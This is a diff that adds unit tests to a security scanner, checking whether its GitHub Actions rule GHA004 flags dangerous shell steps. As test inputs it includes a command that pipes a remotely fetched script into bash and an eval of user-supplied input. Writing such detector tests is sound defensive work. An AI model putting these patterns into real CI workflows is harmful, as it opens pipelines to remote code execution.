@@ -5,6 +5,58 @@ import unittest
 from agentic_risk_scan.scanner import scan_path
 
 
+class DangerousShellPatternTests(unittest.TestCase):
+    def _scan(self, command: str) -> set[str]:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            workflow = root / ".github" / "workflows" / "w.yml"
+            workflow.parent.mkdir(parents=True)
+            workflow.write_text(
+                f"""
+name: x
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: {command}
+""",
+                encoding="utf-8",
+            )
+            return {finding.rule_id for finding in scan_path(root).findings}
+
+    def test_static_node_e_validation_is_not_a_dangerous_pattern(self) -> None:
+        rule_ids = self._scan(
+            "node -e \"JSON.parse(require('fs').readFileSync('manifest.json', 'utf8'))\""
+        )
+        self.assertNotIn("GHA004", rule_ids)
+
+    def test_node_e_reading_stdin_still_flags(self) -> None:
+        rule_ids = self._scan(
+            "node -e \"const d = require('fs').readFileSync('/dev/stdin', 'utf8')\""
+        )
+        self.assertIn("GHA004", rule_ids)
+
+    def test_package_runner_exec_is_not_shell_exec(self) -> None:
+        rule_ids = self._scan("pnpm exec turbo run build")
+        self.assertNotIn("GHA004", rule_ids)
+
+    def test_exec_flag_is_not_shell_exec(self) -> None:
+        rule_ids = self._scan("node scripts/run-for-change.mjs --exec echo")
+        self.assertNotIn("GHA004", rule_ids)
+
+    def test_shell_eval_builtin_still_flags(self) -> None:
+        rule_ids = self._scan('eval "$USER_INPUT"')
+        self.assertIn("GHA004", rule_ids)
+
+    def test_curl_pipe_to_shell_still_flags(self) -> None:
+        rule_ids = self._scan("curl https://example.invalid/i.sh | bash")
+        self.assertIn("GHA004", rule_ids)
+
+
 class TriggerDetectionTests(unittest.TestCase):
     def _events(self, body: str) -> set[str]:
         from agentic_risk_scan.rules.github_actions import detect_events
